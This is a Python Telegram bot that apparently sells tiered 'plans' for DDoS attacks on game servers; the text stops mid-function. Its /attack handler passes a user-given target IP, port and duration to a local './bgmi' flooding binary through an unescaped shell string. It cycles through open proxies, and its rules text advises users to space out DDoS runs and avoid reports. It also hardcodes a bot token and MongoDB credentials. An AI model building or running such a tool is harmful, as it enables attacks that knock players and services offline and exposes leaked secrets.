import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from telebot import types

loop = asyncio.get_event_loop()

TOKEN = '7504537450:AAEMFfPxyjQupTw6Paik6ml7de5Cg4FQZYY'
MONGO_URI = 'mongodb+srv://Cluster0:Cluster0@cluster0.5mvg9ej.mongodb.net/danger?retryWrites=true&w=majority'
FORWARD_CHANNEL_ID = -1002155656757
CHANNEL_ID = -1002155656757
error_channel_id = -1002155656757

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['danger']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 10")
    await process.communicate()
    bot.attack_in_progress = False

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 🚫\n"
                                  "𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "𝗛𝗼𝗹𝗱 𝗼𝗻! ⚠️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗳𝗼𝗿𝗺𝗮𝘁.\n"
                                  "𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 𝗼𝗻𝗲 𝗼𝗳 𝘁𝗵𝗲 𝗳𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
                                  "*1. /𝗮𝗽𝗽𝗿𝗼𝘃𝗲 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗽𝗹𝗮𝗻> <𝗱𝗮𝘆𝘀>*\n"
                                  "*2. /𝗱𝗶𝘀𝗮𝗽𝗽𝗿𝗼𝘃𝗲 <𝘂𝘀𝗲𝗿_𝗶𝗱>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    try:
        target_user_id = int(cmd_parts[1])
    except ValueError:
        bot.send_message(chat_id, "𝗘𝗿𝗿𝗼𝗿: ⚠️ <𝘂𝘀𝗲𝗿_𝗶𝗱> 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮𝗻 𝗶𝗻𝘁𝗲𝗴𝗲𝗿!", parse_mode='Markdown')
        return

    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
    try:
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    except ValueError:
        bot.send_message(chat_id, "𝗘𝗿𝗿𝗼𝗿: ⚠️ <𝗽𝗹𝗮𝗻> 𝗮𝗻𝗱 <𝗱𝗮𝘆𝘀> 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗶𝗻𝘁𝗲𝗴𝗲𝗿𝘀!", parse_mode='Markdown')
        return

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗙𝗮𝗶𝗹𝗲𝗱: 🚫 𝗜𝗻𝘀𝘁𝗮𝗻𝘁 𝗣𝗹𝗮𝗻 🧡 𝗹𝗶𝗺𝗶𝘁 𝗿𝗲𝗮𝗰𝗵𝗲𝗱 (𝟵𝟵 𝘂𝘀𝗲𝗿𝘀).", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗙𝗮𝗶𝗹𝗲𝗱: 🚫 𝗜𝗻𝘀𝘁𝗮𝗻𝘁++ 𝗣𝗹𝗮𝗻 💥 𝗹𝗶𝗺𝗶𝘁 𝗿𝗲𝗮𝗰𝗵𝗲𝗱 (𝟰𝟵𝟵 𝘂𝘀𝗲𝗿𝘀).", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = (f"🎉 𝗖𝗼𝗻𝗴𝗿𝗮𝘁𝘂𝗹𝗮𝘁𝗶𝗼𝗻𝘀!\n"
                    f"𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱!\n"
                    f"𝗣𝗹𝗮𝗻: {plan} 𝗳𝗼𝗿 {days} 𝗱𝗮𝘆𝘀!\n"
                    f"𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗼𝘂𝗿 𝗰𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆! 𝗟𝗲𝘁’𝘀 𝗺𝗮𝗸𝗲 𝘀𝗼𝗺𝗲 𝗺𝗮𝗴𝗶𝗰 𝗵𝗮𝗽𝗽𝗲𝗻! ✨")
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = (f"❌ 𝗗𝗶𝘀𝗮𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗡𝗼𝘁𝗶𝗰𝗲!\n"
                    f"𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱.\n"
                    f"𝗧𝗵𝗲𝘆 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗿𝗲𝘃𝗲𝗿𝘁𝗲𝗱 𝘁𝗼 𝗳𝗿𝗲𝗲 𝗮𝗰𝗰𝗲𝘀𝘀.\n"
                    f"𝗘𝗻𝗰𝗼𝘂𝗿𝗮𝗴𝗲 𝘁𝗵𝗲𝗺 𝘁𝗼 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝘀𝗼𝗼𝗻! 🍀")

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')


@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            response = ("𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 🚫\n"
                        "𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝗯𝗲 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁.\n"
                        "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 𝗳𝗼𝗿 𝗮𝘀𝘀𝗶𝘀𝘁𝗮𝗻𝗰𝗲: [].")
            markup = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="♻️ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗡𝗢𝗪 ♻️", url="")
            button2 = types.InlineKeyboardButton(text="💸 𝗖𝗟𝗜𝗖𝗞 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧 𝗛𝗘𝗥𝗘 💸", url="")
            markup.add(button1)
            markup.add(button2)
            bot.send_message(chat_id, response, parse_mode='Markdown', reply_markup=markup)
            return

        # Check plan limits
        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "𝗜𝗻𝘀𝘁𝗮𝗻𝘁 𝗣𝗹𝗮𝗻 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗳𝘂𝗹𝗹! 🧡\n"
                                       "𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘀𝗶𝗱𝗲𝗿 𝘂𝗽𝗴𝗿𝗮𝗱𝗶𝗻𝗴 𝗳𝗼𝗿 𝗽𝗿𝗶𝗼𝗿𝗶𝘁𝘆 𝗮𝗰𝗰𝗲𝘀𝘀.", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "𝗜𝗻𝘀𝘁𝗮𝗻𝘁++ 𝗣𝗹𝗮𝗻 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗳𝘂𝗹𝗹! 💥\n"
                                       "𝗖𝗼𝗻𝘀𝗶𝗱𝗲𝗿 𝘂𝗽𝗴𝗿𝗮𝗱𝗶𝗻𝗴 𝗼𝗿 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿.", parse_mode='Markdown')
            return

        response = ("𝗥𝗲𝗮𝗱𝘆 𝘁𝗼 𝗹𝗮𝘂𝗻𝗰𝗵 𝗮𝗻 𝗮𝘁𝘁𝗮𝗰𝗸? 💣\n"
                    "𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗜𝗽, 𝗽𝗼𝗿𝘁, 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.\n"
                    "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: 197.67.26 8936 120 🔥\n"
                    "𝗟𝗲𝘁 𝘁𝗵𝗲 𝗰𝗵𝗮𝗼𝘀 𝗯𝗲𝗴𝗶𝗻! 🎉")
        bot.send_message(chat_id, response, parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "𝗘𝗿𝗿𝗼𝗿! ❗\n"
                                               "𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗰𝗼𝗿𝗿𝗲𝗰𝘁 𝗳𝗼𝗿𝗺𝗮𝘁 𝗮𝗻𝗱 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.\n"
                                               "𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘁𝗼 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮𝗹𝗹 𝘁𝗵𝗿𝗲𝗲 𝗶𝗻𝗽𝘂𝘁𝘀! 🔄", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"𝗣𝗼𝗿𝘁 {target_port} 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱. 🔒\n"
                                               "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝗮 𝗱𝗶𝗳𝗳𝗲𝗿𝗲𝗻𝘁 𝗽𝗼𝗿𝘁 𝘁𝗼 𝗽𝗿𝗼𝗰𝗲𝗲𝗱.", parse_mode='Markdown')
            return
        if duration >= 1001:
            bot.send_message(message.chat.id, "𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝘀 1000 𝘀𝗲𝗰𝗼𝗻𝗱𝘀. ⏳\n"
                                               "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗵𝗼𝗿𝘁𝗲𝗻 𝘁𝗵𝗲 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗮𝗻𝗱 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻!", parse_mode='Markdown')
            return  

        # Start the attack immediately without checking for ongoing attacks
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗮𝘂𝗻𝗰𝗵𝗲𝗱! 🚀\n\n"
                                           f"𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗼𝘀𝘁: {target_ip} 📡\n"
                                           f"𝗧𝗮𝗿𝗴𝗲𝘁 𝗣𝗼𝗿𝘁: {target_port} 👉\n"
                                           f"𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀! 𝗟𝗲𝘁 𝘁𝗵𝗲 𝗰𝗵𝗮𝗼𝘀 𝘂𝗻𝗳𝗼𝗹𝗱! 🔥", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

from datetime import datetime
from telebot import types

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
                    user_id = message.from_user.id
                    user_data = users_collection.find_one({"user_id": user_id})

                    if not user_data:
                        response = "❌ 𝗢𝗼𝗽𝘀! 𝗡𝗼 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗳𝗼𝘂𝗻𝗱! \n" 
                        response += "🛠️ 𝗙𝗼𝗿 𝗮𝘀𝘀𝗶𝘀𝘁𝗮𝗻𝗰𝗲, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 : []"
                        markup = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="🥵 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗛𝗘𝗥𝗘 🥵", url="")
                        button2 = types.InlineKeyboardButton(text="💸 𝗖𝗟𝗜𝗖𝗞 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧 𝗛𝗘𝗥𝗘 💸", url="")
                        markup.add(button1)
                        markup.add(button2)

                        bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=markup)

                    elif user_data.get('plan', 0) == 0:
                        response = "🔒 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝗶𝘀 𝘀𝘁𝗶𝗹𝗹 𝗽𝗲𝗻𝗱𝗶𝗻𝗴 𝗮𝗽𝗽𝗿𝗼𝘃𝗮𝗹! \n" 
                        response += "🛠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗮𝗰𝗵 𝗼𝘂𝘁 𝘁𝗼 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 𝗳𝗼𝗿 𝗮𝘀𝘀𝗶𝘀𝘁𝗮𝗻𝗰𝗲 : [] 🙏"

                        # Inline keyboard for unapproved users
                        markup = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="🥵 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗛𝗘𝗥𝗘 🥵", url="")
                        button2 = types.InlineKeyboardButton(text="💸 𝗖𝗟𝗜𝗖𝗞 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧 𝗛𝗘𝗥𝗘 💸", url="")
                        markup.add(button1)
                        markup.add(button2)

                        bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=markup)

                    else:
                        username = message.from_user.username or "Unknown User"
                        plan = user_data.get('plan', 'N/A')
                        valid_until = user_data.get('valid_until', 'N/A')
                        current_time = datetime.now().isoformat()
                        response = (f"👤 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: [@{username}] \n"
                                    f"💸 𝗣𝗟𝗔𝗡: {plan} \n"
                                    f"⏳ 𝗩𝗔𝗟𝗜𝗗 𝗨𝗡𝗧𝗜𝗟: {valid_until} \n"
                                    f"⏰ 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗧𝗜𝗠𝗘: {current_time} \n"
                                    "🌟 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝗯𝗲𝗶𝗻𝗴 𝗮𝗻 𝗶𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁 𝗽𝗮𝗿𝘁 𝗼𝗳 𝗼𝘂𝗿 𝗰𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆! 𝗜𝗳 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗾𝘂𝗲𝘀𝘁𝗶𝗼𝗻𝘀 𝗼𝗿 𝗻𝗲𝗲𝗱 𝗵𝗲𝗹𝗽, 𝗷𝘂𝘀𝘁 𝗮𝘀𝗸! 𝗪𝗲’𝗿𝗲 𝗵𝗲𝗿𝗲 𝗳𝗼𝗿 𝘆𝗼𝘂! 💬🤝")

                        # Inline keyboard for approved users
                        markup = types.InlineKeyboardMarkup()
                        button = types.InlineKeyboardButton(text="❤‍🩹 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗖𝗟𝗜𝗖𝗞 ❤‍🩹", url="")
                        markup.add(button)

                        bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=markup)







@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "📜 𝗕𝗼𝘁 𝗥𝘂𝗹𝗲𝘀 - 𝗞𝗲𝗲𝗽 𝗜𝘁 𝗖𝗼𝗼𝗹!\n\n"
        "1. ⛔ 𝗡𝗼 𝘀𝗽𝗮𝗺𝗺𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸𝘀! \n𝗥𝗲𝘀𝘁 𝗳𝗼𝗿 𝟱-𝟲 𝗺𝗮𝘁𝗰𝗵𝗲𝘀 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 𝗗𝗗𝗢𝗦.\n\n"
        "2. 🔫 𝗟𝗶𝗺𝗶𝘁 𝘆𝗼𝘂𝗿 𝗸𝗶𝗹𝗹𝘀! \n𝗦𝘁𝗮𝘆 𝘂𝗻𝗱𝗲𝗿 𝟯𝟬-𝟰𝟬 𝗸𝗶𝗹𝗹𝘀 𝘁𝗼 𝗸𝗲𝗲𝗽 𝗶𝘁 𝗳𝗮𝗶𝗿.\n\n"
        "3. 🎮 𝗣𝗹𝗮𝘆 𝘀𝗺𝗮𝗿𝘁! \n𝗔𝘃𝗼𝗶𝗱 𝗿𝗲𝗽𝗼𝗿𝘁𝘀 𝗮𝗻𝗱 𝘀𝘁𝗮𝘆 𝗹𝗼𝘄-𝗸𝗲𝘆.\n\n"
        "4. 🚫 𝗡𝗼 𝗺𝗼𝗱𝘀 𝗮𝗹𝗹𝗼𝘄𝗲𝗱! \n𝗨𝘀𝗶𝗻𝗴 𝗵𝗮𝗰𝗸𝗲𝗱 𝗳𝗶𝗹𝗲𝘀 𝘄𝗶𝗹𝗹 𝗴𝗲𝘁 𝘆𝗼𝘂 𝗯𝗮𝗻𝗻𝗲𝗱.\n\n"
        "5. 🤝 𝗕𝗲 𝗿𝗲𝘀𝗽𝗲𝗰𝘁𝗳𝘂𝗹! \n𝗞𝗲𝗲𝗽 𝗰𝗼𝗺𝗺𝘂𝗻𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗳𝗿𝗶𝗲𝗻𝗱𝗹𝘆 𝗮𝗻𝗱 𝗳𝘂𝗻.\n\n"
        "6. 🛡️ 𝗥𝗲𝗽𝗼𝗿𝘁 𝗶𝘀𝘀𝘂𝗲𝘀! \n𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗧𝗼 [] 𝗳𝗼𝗿 𝗮𝗻𝘆 𝗽𝗿𝗼𝗯𝗹𝗲𝗺𝘀.\n\n"
        "💡 𝗙𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲 𝗿𝘂𝗹𝗲𝘀 𝗮𝗻𝗱 𝗹𝗲𝘁’𝘀 𝗲𝗻𝗷𝗼𝘆 𝗴𝗮𝗺𝗶𝗻𝗴 𝘁𝗼𝗴𝗲𝘁𝗵𝗲𝗿!"
    )

    # Create an inline keyboard with a vertical button
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="💝 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 𝗙𝗢𝗥 𝗤𝗨𝗘𝗥𝗜𝗘𝗦 💝", url="")
    markup.add(button)

    try:
        bot.send_message(message.chat.id, rules_text, parse_mode='Markdown', reply_markup=markup)
    except Exception as e:
        print(f"Error while processing /rules command: {e}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("🌟 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗨𝗹𝘁𝗶𝗺𝗮𝘁𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗖𝗲𝗻𝘁𝗲𝗿!\n\n"
                 "𝗛𝗲𝗿𝗲’𝘀 𝘄𝗵𝗮𝘁 𝘆𝗼𝘂 𝗰𝗮𝗻 𝗱𝗼: \n"
                 "*1. ⚔️ 𝗟𝗮𝘂𝗻𝗰𝗵 𝗮 𝗽𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗮𝘁𝘁𝗮𝗰𝗸 𝗮𝗻𝗱 𝘀𝗵𝗼𝘄 𝘆𝗼𝘂𝗿 𝘀𝗸𝗶𝗹𝗹𝘀! `/attack`*\n"
                 "*2. 👤 𝗖𝗵𝗲𝗰𝗸 𝘆𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝗶𝗻𝗳𝗼 𝗮𝗻𝗱 𝘀𝘁𝗮𝘆 𝘂𝗽𝗱𝗮𝘁𝗲𝗱. `/myinfo`*\n"
                 "*3. 📞 𝗚𝗲𝘁 𝗶𝗻 𝘁𝗼𝘂𝗰𝗵 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗺𝗮𝘀𝘁𝗲𝗿𝗺𝗶𝗻𝗱 𝗯𝗲𝗵𝗶𝗻𝗱 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁! `/owner`*\n"
                 "*4. 🦅 𝗚𝗿𝗮𝗯 𝘁𝗵𝗲 𝗹𝗮𝘁𝗲𝘀𝘁 𝗖𝗮𝗻𝗮𝗿𝘆 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 𝗳𝗼𝗿 𝗰𝘂𝘁𝘁𝗶𝗻𝗴-𝗲𝗱𝗴𝗲 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀. `/canary`*\n"
                 "*5. 📜 𝗥𝗲𝘃𝗶𝗲𝘄 𝘁𝗵𝗲 𝗿𝘂𝗹𝗲𝘀 𝘁𝗼 𝗸𝗲𝗲𝗽 𝘁𝗵𝗲 𝗴𝗮𝗺𝗲 𝗳𝗮𝗶𝗿 𝗮𝗻𝗱 𝗳𝘂𝗻. `/rules`*\n\n"
                 "💡 𝗚𝗼𝘁 𝗾𝘂𝗲𝘀𝘁𝗶𝗼𝗻𝘀? 𝗗𝗼𝗻'𝘁 𝗵𝗲𝘀𝗶𝘁𝗮𝘁𝗲 𝘁𝗼 𝗮𝘀𝗸! 𝗬𝗼𝘂𝗿 𝘀𝗮𝘁𝗶𝘀𝗳𝗮𝗰𝘁𝗶𝗼𝗻 𝗶𝘀 𝗼𝘂𝗿 𝗽𝗿𝗶𝗼𝗿𝗶𝘁𝘆!")

    # Create an inline keyboard with buttons arranged vertically
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="🔱 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 🔱", url="")
    button2 = types.InlineKeyboardButton(text="💸 𝗖𝗟𝗜𝗖𝗞 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧 𝗛𝗘𝗥𝗘 💸", url="")

    markup.add(button1)
    markup.add(button2)

    try:
        bot.send_message(message.chat.id, help_text, parse_mode='Markdown', reply_markup=markup)
    except Exception as e:
        print(f"Error while processing /help command: {e}")




@bot.message_handler(commands=['owner'])
def owner_command(message):
    # Create an inline keyboard with a button
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="💪 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 𝗡𝗢𝗪 💪", url="")
    markup.add(button)

    # Define the message content
    response = (
        "👤 𝗢𝘄𝗻𝗲𝗿 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:\n\n"
        "𝗙𝗼𝗿 𝗮𝗻𝘆 𝗶𝗻𝗾𝘂𝗶𝗿𝗶𝗲𝘀, 𝘀𝘂𝗽𝗽𝗼𝗿𝘁, 𝗼𝗿 𝗰𝗼𝗹𝗹𝗮𝗯𝗼𝗿𝗮𝘁𝗶𝗼𝗻 𝗼𝗽𝗽𝗼𝗿𝘁𝘂𝗻𝗶𝘁𝗶𝗲𝘀, 𝗱𝗼𝗻'𝘁 𝗵𝗲𝘀𝗶𝘁𝗮𝘁𝗲 𝘁𝗼 𝗿𝗲𝗮𝗰𝗵 𝗼𝘂𝘁 𝘁𝗼 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿:\n\n"
        "📩 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 : []\n\n"
